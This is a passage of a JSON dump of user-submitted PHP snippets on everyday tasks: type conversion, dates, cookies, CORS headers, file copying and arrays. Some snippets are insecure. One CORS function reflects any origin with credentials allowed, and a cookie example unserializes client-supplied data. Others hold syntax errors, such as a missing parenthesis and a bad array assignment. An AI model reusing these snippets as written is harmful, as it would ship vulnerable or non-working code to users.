    "description": "/** filter_var - Filters a variable with a specific filter **/ $boolvar = filter_var('true', FILTER_VALIDATE_BOOLEAN); /** boolval - Get the boolean value of a variable PHP 5 >= */ $boolvar = boolval ('true'); // And literally with a ternary operator but I can't recommend it $boolvar = ($string === 'true')  ? true: false;   /** We can convert any variable to boolean --- using the (bool) or (boolean) keyword ----- *** But we are talking about conversion not casting *** -   So any String whose length is greater than 0 is true  -   and any number other than 0 is true **/ echo $boolvar = (bool)1; //return true echo $boolvar = (bool)\"true\"; //return true echo $boolvar = (bool)\"false\"; //return true echo $boolvar = (bool)0; //return false echo $boolvar = (bool)\"\"; //return false  var_dump((bool) 0);//return false  var_dump((bool) \"\");//return false \nboolval('false');\n/**  * Strings always evaluate to boolean true unless they have a  * value that's considered \"empty\" by PHP (taken from the  * documentation for empty):  * \"\" (an empty string) evaluates as false.  * \"0\" (0 as a string) evaulates as false.  * If you need to set a boolean based on the text value of a  * string, then you'll need to check for the presence or  * otherwise of that value.  */ $boolean = $string === 'true' ? true: false;\n// (PHP 5 >= 5.5.0, PHP 7) // boolval &mdash; Get the boolean value of a variable boolval ( mixed $var ) : bool // Returns the boolean value of var.\n$converted_res = $res ? 'true' : 'false';\n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3335,
    "keyword": null,
    "link": null,
    "title": " php convert string to chars",
    "description": " <?php  $str = \"Hello Friend\";  $arr1 = str_split($str); $arr2 = str_split($str, 3);  print_r($arr1); print_r($arr2);  ?>  \n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3336,
    "keyword": null,
    "link": null,
    "title": " php convert string to date",
    "description": "$time = strtotime('10/16/2003');  $newformat = date('Y-m-d',$time);  echo $newformat; // 2003-10-16 \n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n$s = '08/11/2010 19:37:02'; $date = strtotime($s); echo date('Y-m-d H:i:s', $date);\n$s = '06/10/2011 19:00:02'; $date = strtotime($s); echo date('d/M/Y H:i:s', $date);\n$originalDate = \"2010-03-21\"; $newDate = date(\"d-m-Y\", strtotime($originalDate));\n$s = '06/10/2011 19:00:02';$date = strtotime($s);echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3337,
    "keyword": null,
    "link": null,
    "title": " php convert string to utf8",
    "description": "utf8_encode ( string $data )\n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3338,
    "keyword": null,
    "link": null,
    "title": " php convert to boolean",
    "description": "/** filter_var - Filters a variable with a specific filter **/ $boolvar = filter_var('true', FILTER_VALIDATE_BOOLEAN); /** boolval - Get the boolean value of a variable PHP 5 >= */ $boolvar = boolval ('true'); // And literally with a ternary operator but I can't recommend it $boolvar = ($string === 'true')  ? true: false;   /** We can convert any variable to boolean --- using the (bool) or (boolean) keyword ----- *** But we are talking about conversion not casting *** -   So any String whose length is greater than 0 is true  -   and any number other than 0 is true **/ echo $boolvar = (bool)1; //return true echo $boolvar = (bool)\"true\"; //return true echo $boolvar = (bool)\"false\"; //return true echo $boolvar = (bool)0; //return false echo $boolvar = (bool)\"\"; //return false  var_dump((bool) 0);//return false  var_dump((bool) \"\");//return false \nboolval('false');\n/**  * Strings always evaluate to boolean true unless they have a  * value that's considered \"empty\" by PHP (taken from the  * documentation for empty):  * \"\" (an empty string) evaluates as false.  * \"0\" (0 as a string) evaulates as false.  * If you need to set a boolean based on the text value of a  * string, then you'll need to check for the presence or  * otherwise of that value.  */ $boolean = $string === 'true' ? true: false;\n// (PHP 5 >= 5.5.0, PHP 7) // boolval &mdash; Get the boolean value of a variable boolval ( mixed $var ) : bool // Returns the boolean value of var.\n$converted_res = $res ? 'true' : 'false';\n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3339,
    "keyword": null,
    "link": null,
    "title": " php convert to lowercase",
    "description": "strtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' $string = 'HeLlO WoRlD'; echo strtolower($string); //Output: 'hello world'\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world'\n/* The strtolower() function converts a string to lowercase. Convert all characters to lowercase.*/ <?php echo strtolower(\"Hello WORLD.\"); ?> // Output: hello world.\nThe strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\n/* There is a function in php wich convert all paragraph or  string to lowercase*/ <?php echo strtolower(\"Hey Samy, HAVE YOU CHECK THE LATEST MOVIE.\");   // Output: hey samy, have you check the latest movie. ?> \n<?php echo strtolower(\"Convert THIS TEXT ALL TO LOWER CASE\"); ?>\n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3340,
    "keyword": null,
    "link": null,
    "title": " php convert to string",
    "description": "return strval($integer);\n$number = 10; // To convert this number to a string: $numberString = (string)$number;\n$var = 5;  // Inline variable parsing echo \"I'd like {$var} waffles\"; // = \"I'd like 5 waffles  // String concatenation  echo \"I'd like \".$var.\" waffles\"; // I'd like 5 waffles  // Explicit cast  $items = (string)$var; // $items === \"5\";  // Function call $items = strval($var); // $items === \"5\"; \n<?php class StrValTest {     public function __toString()     {         return __CLASS__;     } }  // Prints 'StrValTest' echo strval(new StrValTest); ?>\necho \"'$animal'\";\n$stuff = array(1,2,3); print_r($stuff); $stuff = array(3,4,5); var_dump($stuff);\n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3341,
    "keyword": null,
    "link": null,
    "title": " php convert unix time to date",
    "description": "<?php $timestamp=1333699439; echo gmdate(\"Y-m-d\\TH:i:s\\Z\", $timestamp); ?>\n$currentTime = DateTime::createFromFormat( 'U', $timestamp ); \n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3342,
    "keyword": null,
    "link": null,
    "title": " php convert us date to european",
    "description": "$originalDate = \"2010-03-21\"; $newDate = date(\"d-m-Y\", strtotime($originalDate));\n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3343,
    "keyword": null,
    "link": null,
    "title": " php convert words with spaces to camelcase",
    "description": "public static function camelCase($str, array $noStrip = []) {         // non-alpha and non-numeric characters become spaces         $str = preg_replace('/[^a-z0-9' . implode(\"\", $noStrip) . ']+/i', ' ', $str);         $str = trim($str);         // uppercase the first character of each word         $str = ucwords($str);         $str = str_replace(\" \", \"\", $str);         $str = lcfirst($str);          return $str; }\necho ucwords(\"hello world\"); \n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3344,
    "keyword": null,
    "link": null,
    "title": " php cookie",
    "description": "//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. ==================== Version 1 for cookies ====================  <?php if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }   ==================== Version 2 for cookies ==================== <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ======================= Version 3 for cookies =======================  <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day     //to unset a cookie just set the time that is already past     //delete cookie     setcookie('nameofcookie','Frank', time() -3600);  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ========================= Version 4 check for cookies ========================= <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day      if(count($_COOKIE) > 0){         echo 'There are ' . count($_COOKIE)  .  ' cookies saved<br>';         }else{             echo 'There are no cookies saved<br>';         }  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; } \nsetcookie(\"cookiename\", \"cookievalue\", time(), \".mydomain.tld\", \"/\")  // coookiename: The name of your cookie // cookievalue: The value of your cookie // Time: The expiration date of your cookie. If you plan to make a product for the EU, it's 13 months max. // .mydomain.tld: The domain that your webpage is using. You can only use the domain that the PHP file is on. Adding a dot before your domain will cover all subdomains. // \"/\": This is the folder where your cookie will apply. If you want a specific cookie for the /mySpecialSuperSecretPages folder, you have to set /mySpecialSuperSecretPages // Check the source for more options.\n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible.  <?php if(isset($_POST['submit'])){     $username = htmlentities($_POST['username']);      setcookie('nameofcookie', $username, time()+3600);      //1hour time limit      header('Location: page2.php'); } ?>  <!DOCTYPE html> <html> <head>     <title>PHP Cookies</title> </head> <body>         <form method=\"POST\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">                 <input type=\"text\" name=\"username\" placeholder=\"Enter Username\">                 <br>                 <input type=\"submit\" name=\"submit\" value=\"Submit\">             </form>         </div> </body> </html>\n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. //save addional information as an array in a cookie <?php     $user = ['name' => 'Brad', 'email' => 'test@test.com', 'age' = 35];      $user = serialize($user);      setcookie('user', $user, time() + (86400 *30));          $user = unserialize($_COOKIE['user']);      echo $user['name'];\n$cookiename = $_COOKIE['COOKIE ID']\nsetcookie ('name', 'value', $expiresOn, $path, $domain, $secure, $httponly)\n",
    "reg_date": "2021-10-12T10:17:49.000Z"
  },
  {
    "id": 3345,
    "keyword": null,
    "link": null,
    "title": " php cookie never expire",
    "description": "//20 year long cookie setcookie(   \"CookieName\",   \"CookieValue\",   time() + (20 * 365 * 24 * 60 * 60) );\nsetcookie(\"CookieName\", \"CookieValue\", 2147483647); \n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3346,
    "keyword": null,
    "link": null,
    "title": " php cookies",
    "description": "//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. ==================== Version 1 for cookies ====================  <?php if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }   ==================== Version 2 for cookies ==================== <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ======================= Version 3 for cookies =======================  <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day     //to unset a cookie just set the time that is already past     //delete cookie     setcookie('nameofcookie','Frank', time() -3600);  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ========================= Version 4 check for cookies ========================= <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day      if(count($_COOKIE) > 0){         echo 'There are ' . count($_COOKIE)  .  ' cookies saved<br>';         }else{             echo 'There are no cookies saved<br>';         }  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; } \n//Parameter of Cookie  //only first line is usable other lines is for descrption setcookie($cookiename ,$cookievalue , time() + (86400 * 10) , \"/\" , domain.com ,True , False);   //Explanation setcookie(name , value, time, path, domain , secure, httponly)   1.name is the name of cookie   2.value is the value that you want to save in cookie   3.time is expire time of cookie and it is set in sec so 86400 sec is   equal to 1 day time() function get the current time and 86400 * 10 means   after 10 days cookie will be expire   4.path is path of  website to access coookie if we use \"/\" it means we can      access cookie from every page   5.domain is the domain from which you want to access the cookie if we use      domain then we only access cookie from that specific domain   6.secure means HTTPs protocol if its True it means cookie only set if its      HTTPs otherwise cookie cannot set   7.HTTPonly means if its false we can access cookie from localsite(javascript)     and serversite but if its Ture other wise from only serversite (php)\n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible.  <?php if(isset($_POST['submit'])){     $username = htmlentities($_POST['username']);      setcookie('nameofcookie', $username, time()+3600);      //1hour time limit      header('Location: page2.php'); } ?>  <!DOCTYPE html> <html> <head>     <title>PHP Cookies</title> </head> <body>         <form method=\"POST\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">                 <input type=\"text\" name=\"username\" placeholder=\"Enter Username\">                 <br>                 <input type=\"submit\" name=\"submit\" value=\"Submit\">             </form>         </div> </body> </html>\n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. //save addional information as an array in a cookie <?php     $user = ['name' => 'Brad', 'email' => 'test@test.com', 'age' = 35];      $user = serialize($user);      setcookie('user', $user, time() + (86400 *30));          $user = unserialize($_COOKIE['user']);      echo $user['name'];\nsetcookie ('name', 'value', $expiresOn, $path, $domain, $secure, $httponly)\nsetcookie(\"cookie_name\", \"type_on_cookie\", expiry_time(), \"/\");\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3347,
    "keyword": null,
    "link": null,
    "title": " php copy",
    "description": " <?php $file = 'example.txt'; $newfile = 'example.txt.bak';  if (!copy($file, $newfile)) {     echo \"failed to copy $file...\\n\"; } ?>  \n$file = 'http://3.bp.blogspot.com/-AGI4aY2SFaE/Tg8yoG3ijTI/AAAAAAAAA5k/nJB-mDhc8Ds/s400/rizal001.jpg'; $newfile = '/img/submitted/yoyo.jpg';  if ( copy($file, $newfile) ) {     echo \"Copy success!\"; }else{ echo \"Copy failed.\"; }\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3348,
    "keyword": null,
    "link": null,
    "title": " php copy array",
    "description": "// PHP will copy the array by default. $a = array(1,2);  $b = $a; // $b will be a different array  $c = &$a; // $c and $a will be the same array (same reference)\n$arr1 = ['a'=>1, 'b'=>2, 'c'=>3]; $arr2 = $arr1;  unset($arr2['a']; print_r($arr1); //['b'=>2, 'c'=>3] // ------- OR ------- $arr2 = clone $arr1;  unset($arr2['a']; print_r($arr1); //['a'=>1, 'b'=>2, 'c'=>3]\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3349,
    "keyword": null,
    "link": null,
    "title": " php copy file",
    "description": "// Will copy foo/test.php to bar/test.php // overwritting it if necessary copy('foo/test.php', 'bar/test.php'); \n <?php $file = 'example.txt'; $newfile = 'example.txt.bak';  if (!copy($file, $newfile)) {     echo \"failed to copy $file...\\n\"; } ?>  \nPress Ctrl+Shift+C  copy file path in php storm\n$file = 'http://3.bp.blogspot.com/-AGI4aY2SFaE/Tg8yoG3ijTI/AAAAAAAAA5k/nJB-mDhc8Ds/s400/rizal001.jpg'; $newfile = '/img/submitted/yoyo.jpg';  if ( copy($file, $newfile) ) {     echo \"Copy success!\"; }else{ echo \"Copy failed.\"; }\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3350,
    "keyword": null,
    "link": null,
    "title": " php copy url",
    "description": "$file = 'http://3.bp.blogspot.com/-AGI4aY2SFaE/Tg8yoG3ijTI/AAAAAAAAA5k/nJB-mDhc8Ds/s400/rizal001.jpg'; $newfile = '/img/submitted/yoyo.jpg';  if ( copy($file, $newfile) ) {     echo \"Copy success!\"; }else{ echo \"Copy failed.\"; } \n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3351,
    "keyword": null,
    "link": null,
    "title": " php copyright footer",
    "description": "&copy; <?php echo date(\"Y\"); ?> Copyright.\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3352,
    "keyword": null,
    "link": null,
    "title": " php cors",
    "description": "<?php header(\"Access-Control-Allow-Origin: *\"); header(\"Access-Control-Allow-Headers: *\"); ...\n <?php  header(\"Access-Control-Allow-Origin: *\");\n/**  *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any  *  origin.  *  *  In a production environment, you probably want to be more restrictive, but this gives you  *  the general idea of what is involved.  For the nitty-gritty low-down, read:  *  *  - https://developer.mozilla.org/en/HTTP_access_control  *  - https://fetch.spec.whatwg.org/#http-cors-protocol  *  */ function cors() {          // Allow from any origin     if (isset($_SERVER['HTTP_ORIGIN'])) {         // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one         // you want to allow, and if so:         header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");         header('Access-Control-Allow-Credentials: true');         header('Access-Control-Max-Age: 86400');    // cache for 1 day     }          // Access-Control headers are received during OPTIONS requests     if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {                  if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))             // may also be using PUT, PATCH, HEAD etc             header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS\");                           if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))             header(\"Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}\");              exit(0);     }          echo \"You have CORS!\"; } \n/**  *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any  *  origin.  *  *  In a production environment, you probably want to be more restrictive, but this gives you  *  the general idea of what is involved.  For the nitty-gritty low-down, read:  *  *  - https://developer.mozilla.org/en/HTTP_access_control  *  - http://www.w3.org/TR/cors/  *  */ function cors() {      // Allow from any origin     if (isset($_SERVER['HTTP_ORIGIN'])) {         // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one         // you want to allow, and if so:         header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");         header('Access-Control-Allow-Credentials: true');         header('Access-Control-Max-Age: 86400');    // cache for 1 day     }      // Access-Control headers are received during OPTIONS requests     if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))             // may also be using PUT, PATCH, HEAD etc             header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS\");                   if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))             header(\"Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}\");          exit(0);     }      echo \"You have CORS!\"; }\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3353,
    "keyword": null,
    "link": null,
    "title": " php count amount of times a value appears in array",
    "description": "$tmp = array_count_values($uid); $cnt = $tmp[12]; //Or $cnt = count(array_filter($uid,function($a) {return $a==12;})); //In both cases $var will be a number\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3354,
    "keyword": null,
    "link": null,
    "title": " php count array elements with specific key",
    "description": "$cnt = count(array_filter($array,function($element) {   return $element['your_key']=='foo'; }));\n$tmp = array_count_values($uid); $cnt = $tmp[12]; //Or $cnt = count(array_filter($uid,function($a) {return $a==12;})); //In both cases $var will be a number\n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3355,
    "keyword": null,
    "link": null,
    "title": " php count items in array",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\n<?php  $vegetables = [\"Cabbage\", \"Carrot\", \"Lettuce\"];  $arrayLength = count($vegetables);  echo $arrayLength; //returns 3 ?>\n <?php $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));  $b[0]  = 7; $b[5]  = 9; $b[10] = 11; var_dump(count($b));  var_dump(count(null));  var_dump(count(false)); ?>   /* result       int(3) int(3)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 12 // as of PHP 7.2 int(0)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 14 // as of PHP 7.2 int(1)  */ <?php $a=array(\"A\",\"Cat\",\"Dog\",\"A\",\"Dog\"); print_r(array_count_values($a)); ?>  <?php  $vegetables = [\"Cabbage\", \"Carrot\", \"Lettuce\"];  $arrayLength = count($vegetables);  echo $arrayLength; //returns 3 ?> $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); //returns 3\n <?php $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));  $b[0]  = 7; $b[5]  = 9; $b[10] = 11; var_dump(count($b));  var_dump(count(null));  var_dump(count(false)); ?>   /* result       int(3) int(3)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 12 // as of PHP 7.2 int(0)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 14 // as of PHP 7.2 int(1)  */  \n",
    "reg_date": "2021-10-12T10:17:50.000Z"
  },
  {
    "id": 3356,
    "keyword": null,
    "link": null,
    "title": " php count number of files in directory",
    "description": "$fi = new FilesystemIterator(__DIR__, FilesystemIterator::SKIP_DOTS); printf(\"There were %d Files\", iterator_count($fi));\n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3357,
    "keyword": null,
    "link": null,
    "title": " php count specific characters in string",
    "description": "<?php //you can use the substr_count function $str = \"this is a test string\";   echo substr_count($str, \"s\");  //Output: 4 ?>\n<?php $str1 = 'Hello world!'; echo strlen($str1); // Outputs: 12\n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3358,
    "keyword": null,
    "link": null,
    "title": " php count string in array",
    "description": " <?php $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));  $b[0]  = 7; $b[5]  = 9; $b[10] = 11; var_dump(count($b));  var_dump(count(null));  var_dump(count(false)); ?>   /* result       int(3) int(3)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 12 // as of PHP 7.2 int(0)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 14 // as of PHP 7.2 int(1)  */ <?php $a=array(\"A\",\"Cat\",\"Dog\",\"A\",\"Dog\"); print_r(array_count_values($a)); ?>  <?php  $vegetables = [\"Cabbage\", \"Carrot\", \"Lettuce\"];  $arrayLength = count($vegetables);  echo $arrayLength; //returns 3 ?> $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); //returns 3\n <?php $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));  $b[0]  = 7; $b[5]  = 9; $b[10] = 11; var_dump(count($b));  var_dump(count(null));  var_dump(count(false)); ?>   /* result       int(3) int(3)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 12 // as of PHP 7.2 int(0)  Warning: count(): Parameter must be an array or an object that implements Countable in &hellip; on line 14 // as of PHP 7.2 int(1)  */  \n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3359,
    "keyword": null,
    "link": null,
    "title": " php create 404 error",
    "description": "<?php http_response_code(404); include('my_404.php'); // provide your own HTML for the error page die();\nErrorDocument 400 /400.phpErrorDocument 401 /401.phpErrorDocument 403 /403.phpErrorDocument 404 /404.php #Don't re-add this lineErrorDocument 500 /500.php\n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3360,
    "keyword": null,
    "link": null,
    "title": " php create an image",
    "description": "<?php header(\"Content-Type: image/png\");//change the php file to an image $im = @imagecreate(110, 20)     or die(\"Cannot Initialize new GD image stream\");//creates an image with the resolution x:110 y:20  $background_color = imagecolorallocate($im, 0, 0, 0);//create an color with RGB $text_color = imagecolorallocate($im, 233, 14, 91); imagestring($im, 1, 5, 5,  \"A Simple Text String\", $text_color);//draws text to the image with the font:1 xpos:5 ypos:5  imagepng($im);//sends the image data to the user imagedestroy($im);//destroys the image from the server ?>\n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3361,
    "keyword": null,
    "link": null,
    "title": " php create file if not exist",
    "description": "<?php  $file = 'test.txt';  if(!is_file($file)){     $contents = 'This is a test!';           // Some simple example content.     file_put_contents($file, $contents);     // Save our content to the file. }  ?> \n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3362,
    "keyword": null,
    "link": null,
    "title": " php create from format",
    "description": " <?php $date = DateTime::createFromFormat('j-M-Y', '15-Feb-2009'); echo $date->format('Y-m-d'); ?>  \n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3363,
    "keyword": null,
    "link": null,
    "title": " php create object",
    "description": "$x = (object) [     'a' => 'test',     'b' => 'test2',     'c' => 'test3' ]; var_dump($x);  /* object(stdClass)#1 (3) {   [\"a\"]=>   string(4) \"test\"   [\"b\"]=>   string(5) \"test2\"   [\"c\"]=>   string(5) \"test3\" } */\n$x = new stdClass();\n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n<?php class Fruit {   public $name;   public $color;    function __construct($name, $color) {     $this->name = $name;     $this->color = $color;   }   function get_name() {     return $this->name;   }   function get_color() {     return $this->color;   } }  $apple = new Fruit(\"Apple\", \"red\"); echo $apple->get_name(); echo \"<br>\"; echo $apple->get_color(); ?>\n<?php class Bike {     function model()     {         $model_name = 'cd100';         echo \"bike model:$model_name\";     } } $obj = new Bike(); $obj->model(); ?>\n//object init   $object = (object) [     'propertyOne' => 'foo',     'propertyTwo' => 42,   ];\n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3364,
    "keyword": null,
    "link": null,
    "title": " php create object without clas",
    "description": "//create a person object in PHP  $person=new stdClass();  $person->firstName=\"Chuck\";  $person->lastName=\"Bartowski\";  $person->age=27;    print_r($person);    \n",
    "reg_date": "2021-10-12T10:17:51.000Z"
  },
  {
    "id": 3365,
    "keyword": null,
    "link": null,
    "title": " php create object without class",
    "description": "//create a person object in PHP  $person=new stdClass();  $person->firstName=\"Chuck\";  $person->lastName=\"Bartowski\";  $person->age=27;    print_r($person);    \n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3366,
    "keyword": null,
    "link": null,
    "title": " php create pdf",
    "description": "<?php //install Dompdf library at link below: //https://github.com/dompdf/dompdf use Dompdf\\Dompdf; session_start();    // Include the database   $servername = \"\";   $username = \"\";   $password = \"\";   $dbname = \"\";    // Create connection   $conn = new mysqli($servername, $username, $password, $dbname);   // Check connection   if ($conn->connect_error) {   die(\"Connection failed: \" . $conn->connect_error);   }        $html = '<table border=1>';\t     $html .= '<thead>';     $html .= '<tr>';     $html .= '<th>ID</th>';     $html .= '<th>Collum1</th>';     $html .= '<th>Collum2</th>';     $html .= '<th>Collum3</th>';     $html .= '</tr>';     $html .= '</thead>';     $html .= '<tbody>';          $sql = \"SELECT * FROM tableName\";     $sql = mysqli_query($conn, $sql);     while($row = mysqli_fetch_assoc($sql)){             $html = ''; // your html code\t\t     }         // include autoloader     require_once(\"dompdf/autoload.inc.php\");      //Create instance     $dompdf = new DOMPDF();          // Upload your HTML code     $dompdf->load_html('         <h1 style=\"text-align: center;\">RentCar</h1>         '. $html .'       ');      //Render html     $dompdf->render();      //Create and output the pdf      $pdf = $dompdf->output();      //Visualize the page     $dompdf->stream(       \"form.pdf\",        array(         \"Attachment\" => false //To download turn it to true, to preview pdf turn it to false       )     );  ?>\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3367,
    "keyword": null,
    "link": null,
    "title": " php create temporary file",
    "description": "// Works on Native Server // $tmp = tmpfile(); // $newfilename = 'newfile.txt'; // fwrite($tmp, \"This is a sample string as a content.\"); // fseek($tmp, 0);  // Works on Google App Engine $dir = sys_get_temp_dir(); $tmp = tempnam($dir, \"foo\"); file_put_contents($tmp, \"hello\"); //$f = fopen($tmp, \"a\"); //fwrite($f, \" world\"); //fclose($f); //echo file_get_contents($tmp);\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3368,
    "keyword": null,
    "link": null,
    "title": " php create url with query sting from array",
    "description": " <?php $data = array(     'foo' => 'bar',     'baz' => 'boom',     'cow' => 'milk',     'php' => 'hypertext processor' );  echo http_build_query($data) . \"\\n\"; echo http_build_query($data, '', '&');  ?>  \n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3369,
    "keyword": null,
    "link": null,
    "title": " php create zip from folder",
    "description": "<?php class FlxZipArchive extends ZipArchive  {  public function addDir($location, $name)   {        $this->addEmptyDir($name);        $this->addDirDo($location, $name);  }   private function addDirDo($location, $name)   {     $name .= '/';     $location .= '/';     $dir = opendir ($location);     while ($file = readdir($dir))     {         if ($file == '.' || $file == '..') continue;         $do = (filetype( $location . $file) == 'dir') ? 'addDir' : 'addFile';         $this->$do($location . $file, $name . $file);     }  }  } ?>  <?php $the_folder = '/path/to/folder/to/be/zipped'; $zip_file_name = '/path/to/zip/archive.zip'; $za = new FlxZipArchive; $res = $za->open($zip_file_name, ZipArchive::CREATE); if($res === TRUE)  {     $za->addDir($the_folder, basename($the_folder));     $za->close(); } else{ echo 'Could not create a zip archive'; } ?>\n",
    "reg_date": "2021-10-12T10:17:52.000Z"
  },
  {
    "id": 3370,
    "keyword": null,
    "link": null,
    "title": " php creazione numero random",
    "description": "<? $numero = rand(0,100); echo $numero; ?>\n",
